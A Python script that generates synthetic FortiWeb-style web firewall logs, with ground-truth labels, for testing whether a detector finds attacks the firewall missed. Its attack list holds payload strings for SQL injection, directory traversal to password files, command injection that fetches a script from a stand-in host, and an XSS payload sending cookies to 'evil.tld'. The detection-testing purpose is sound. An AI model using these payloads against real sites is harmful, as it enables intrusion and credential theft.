"""Генератор синтетичних логів у стилі FortiWeb (для перевірки без реальних даних).

Частину атак «FortiWeb» ловить (type=attack, action=Alert_Deny),
частину — пропускає (type=traffic). Справжні мітки пишуться в окремий файл,
щоб перевірити, чи муха знаходить те, що FortiWeb пропустив.
"""
from __future__ import annotations

import random
from datetime import datetime, timedelta
from urllib.parse import quote

PAGES = ["/", "/index.html", "/catalog", "/catalog/item?id={n}", "/news/{n}", "/about",
         "/contacts", "/search?q={w}", "/cart", "/api/v1/products?page={p}&limit=20",
         "/api/v1/user/profile", "/static/js/app.{h}.js", "/static/css/main.{h}.css",
         "/img/p{n}.webp", "/favicon.ico", "/login"]
WORDS = ["phone", "laptop", "чайник", "shoes", "kyiv", "sale", "gift", "book", "lamp"]
BROWSERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/129.0 Mobile Safari/537.36",
]
ATTACKS = {
    "SQL Injection": ["/catalog/item?id={n}' OR 1=1--", "/search?q=x' UNION SELECT username,password FROM users--",
                      "/api/v1/products?page=1;WAITFOR DELAY '0:0:5'--", "/catalog/item?id={n} AND SLEEP(5)"],
    "Cross Site Scripting": ["/search?q=<script>alert(1)</script>", "/news/{n}?ref=\"><img src=x onerror=alert(1)>",
                             "/search?q=<svg/onload=fetch('//evil.tld/'+document.cookie)>"],
    "Directory Traversal": ["/static/../../../../etc/passwd", "/download?file=../../../../windows/win.ini",
                            "/img/..%2f..%2f..%2fetc%2fshadow"],
    "Command Injection": ["/api/v1/ping?host=127.0.0.1;cat /etc/passwd", "/cgi-bin/test.cgi?x=$(id)",
                          "/api/v1/ping?host=8.8.8.8 && wget http://evil.tld/x.sh"],
    "Info Disclosure": ["/.env", "/.git/config", "/backup.sql", "/wp-admin/install.php", "/phpmyadmin/",
                        "/config.php.bak", "/server-status", "/.DS_Store"],
}
TOOLS = ["sqlmap/1.8.4#stable (https://sqlmap.org)", "Mozilla/5.00 (Nikto/2.5.0)", "python-requests/2.32.3",
         "curl/8.5.0", "Go-http-client/1.1", "Mozilla/5.0 zgrab/0.x", ""]


def _fill(t: str, rnd: random.Random) -> str:
    return t.format(n=rnd.randint(1, 5000), w=quote(rnd.choice(WORDS)), p=rnd.randint(1, 30),
                    h=rnd.choice(["a1b2c3", "9f8e7d", "4c4c4c"]))


def _line(ts, src, method, url, agent, code, typ="traffic", action="Accept", sub="", ref="none", sev="Low"):
    base = (f'date={ts:%Y-%m-%d} time={ts:%H:%M:%S} log_id={"20000008" if typ == "attack" else "30001000"} '
            f'device_id=FV-1KF000000000 vd="root" type={typ} pri={"alert" if typ == "attack" else "notice"} ')
    if typ == "attack":
        base += f'main_type="Signature Detection" sub_type="{sub}" severity_level={sev} '
    return (base + f'proto=tcp service=https/tls1.3 action={action} policy="shop-policy" src={src} '
            f'src_port={random.randint(1024, 65535)} dst=10.0.0.10 dst_port=443 http_method={method.lower()} '
            f'http_url="{url}" http_host="shop.example.ua" http_agent="{agent}" http_retcode={code} '
            f'http_refer="{ref}" srccountry="Ukraine"')


def generate(n_benign: int = 20000, n_attack: int = 1200, catch_rate: float = 0.6, seed: int = 7):
    rnd = random.Random(seed)
    random.seed(seed)
    t0 = datetime(2026, 10, 1, 8, 0, 0)
    span = 6 * 3600
    events = []  # (ts, line, truth)
    users = [(f"93.{rnd.randint(70, 79)}.{rnd.randint(0, 255)}.{rnd.randint(1, 254)}", rnd.choice(BROWSERS))
             for _ in range(400)]
    for _ in range(n_benign):
        ip, ua = rnd.choice(users)
        ts = t0 + timedelta(seconds=rnd.uniform(0, span))
        url = _fill(rnd.choice(PAGES), rnd)
        method = "POST" if url == "/login" and rnd.random() < 0.5 else "GET"
        code = rnd.choices([200, 304, 404, 302], [85, 8, 4, 3])[0]
        ref = "https://shop.example.ua/" if rnd.random() < 0.7 else "none"
        events.append((ts, _line(ts, ip, method, url, ua, code, ref=ref), 0))

    n_done = 0
    while n_done < n_attack:
        kind = rnd.choice(list(ATTACKS) + ["Brute Force", "Scanner"])
        ip = f"{rnd.choice([45, 185, 194, 103])}.{rnd.randint(0, 255)}.{rnd.randint(0, 255)}.{rnd.randint(1, 254)}"
        agent = rnd.choice(TOOLS + BROWSERS[:2])
        start = t0 + timedelta(seconds=rnd.uniform(0, span))
        burst = rnd.randint(5, 40) if kind in ("Brute Force", "Scanner") else rnd.randint(1, 6)
        for j in range(burst):
            ts = start + timedelta(seconds=j * rnd.uniform(0.1, 2.0))
            if kind == "Brute Force":
                url, method, code = "/login", "POST", rnd.choice([401, 401, 401, 200])
            elif kind == "Scanner":
                url = rnd.choice(ATTACKS["Info Disclosure"] + ["/admin", "/test", "/old", "/api/v2/", "/debug"])
                method, code = "GET", 404
            else:
                url, method, code = _fill(rnd.choice(ATTACKS[kind]), rnd), "GET", rnd.choice([200, 403, 500])
            if rnd.random() < catch_rate and kind not in ("Scanner",):
                line = _line(ts, ip, method, url, agent, 403, "attack", "Alert_Deny", kind, sev="High")
            else:
                line = _line(ts, ip, method, url, agent, code)
            events.append((ts, line, 1))
            n_done += 1
    events.sort(key=lambda e: e[0])
    return [e[1] for e in events], [e[2] for e in events]


def write(log_path: str, truth_path: str, **kw) -> None:
    lines, truth = generate(**kw)
    with open(log_path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")
    with open(truth_path, "w") as f:
        f.write("\n".join(map(str, truth)) + "\n")
